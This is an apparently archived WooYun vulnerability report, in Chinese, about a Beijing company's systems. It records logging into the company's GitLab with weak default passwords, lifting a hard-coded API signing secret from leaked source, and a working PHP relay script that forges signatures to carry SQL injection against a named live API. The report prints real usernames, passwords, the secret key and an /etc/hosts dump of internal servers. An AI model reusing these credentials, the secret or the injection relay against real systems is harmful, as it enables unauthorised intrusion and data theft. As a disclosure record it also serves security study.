{"id": 88527, "wybug_id": "wooyun-2016-0215977", "wybug_title": "北京黑米git弱口令导致SQL注入（参数签名中转注射案例）                                      ", "wybug_corp": "747.cn", "wybug_author": "scanf", "wybug_date": "2016-06-03 19:31", "wybug_open_date": "2016-07-09 16:30", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-06-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-06-03：\t厂商已查看当前漏洞内容,细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-07-09：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： . 详细说明：  http://git.747.cn/users/sign_in  跑了一下zhangxuan 123456还有个管理员权限的 liuchao 123456可以添加用户和添加进项目小组里面泄漏各种项目源码\n\n\n\n\n\nhttp://git.747.cn/zhangxuan/heimilink_api/blob/master/heimi_api%20interface.txt发现了一个这个文档 结合前面提交的注入觉得一定有注入.由于其他的要验证登录了没有就只有第4个了4. 获取用户渠道编号访问地址: 根域名 + /user/info/getchannelid?hm_uid=[用户ID]&hm_dateline=[时间截]&hm_sign=[数字签名]签名生成方法: $sign = sha1( 用户ID  .   SEC秘钥  .  时间截) ;示例: http://hmapi.showboom.cn/user/info/getchannelid?hm_uid=17&hm_dateline=1453345011&hm_sign=e9ed25d7cb259a4ed9eb1df1aaddeaa150622072嗯 hm_uid hm_dateline知道SECSEC秘钥在php里面 http://git.747.cn/zhangxuan/heimilink_api/blob/master/application/modules/User/controllers/Info.php加密算法知道了我们写个脚本\n\n\n\n嗯存在注入写个中转吧.   漏洞证明：  \n<?php$SEC = '0d70d259cd54875a44654f5e856df327';$userid = stripslashes($_GET['userid']);$dateline= '1453345011';$sign = sha1( $userid  .   $SEC  .  $dateline) ;$uri = 'https://hmapi.showboom.cn/user/info/getchannelid?hm_uid='.$userid.'&hm_dateline=1453345011&hm_sign='.$sign;$header = array();$ch = curl_init ();curl_setopt ( $ch, CURLOPT_URL, $uri );curl_setopt ( $ch, CURLOPT_HEADER, 1 );curl_setopt ( $ch, CURLOPT_RETURNTRANSFER, 1 );//httpscurl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);curl_setopt($ch,CURLOPT_HTTPHEADER,$header);     $return = curl_exec ( $ch );curl_close ( $ch );{echo $return;}?>\nuser\n\n读取/etc/hosts\n127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4::1 localhost localhost.localdomain localhost6 localhost6.localdomain610.0.2.251 a180110.0.2.10 a180210.0.2.11 a180310.0.2.12 a180410.0.2.13 a180510.0.2.14 a180610.0.2.15 a180710.0.2.16 a180810.0.2.17 a180910.0.2.18 a181010.0.3.10 a170110.0.3.11 a170210.0.3.12 a170310.0.3.13 a170410.0.3.14 a170510.0.3.15 a170610.0.3.16 a170710.0.3.17 a170810.0.3.18 a170910.0.3.19 a171010.0.3.20 a171110.0.3.21 a171210.0.2.19 a160210.0.2.20 a160310.0.2.6 a160410.0.2.8 a160510.0.2.7 a160610.0.2.21 a160710.0.2.22 a160810.0.2.23 a160910.0.2.24 a161010.0.2.25 a161110.0.3.51 a150110.0.3.52 a150210.0.3.53 a150310.0.3.54 a150410.0.3.55 a150510.0.3.56 a150610.0.3.57 a150710.0.3.58 a150810.0.3.59 a1509\n内网服务器好多.\n\n   修复方案：  额 看了一下源码发现几乎都没有过滤或者参数化查询语句.   版权声明：转载请注明来源 scanf@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-07-09 16:30 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-06-04 12:27 |    \t\t窝窝哥 \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:32        | 没WB啊啊啊啊！)\t\t \n  然后他送了个WiFi盒子给你还是3G的那种。。。。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}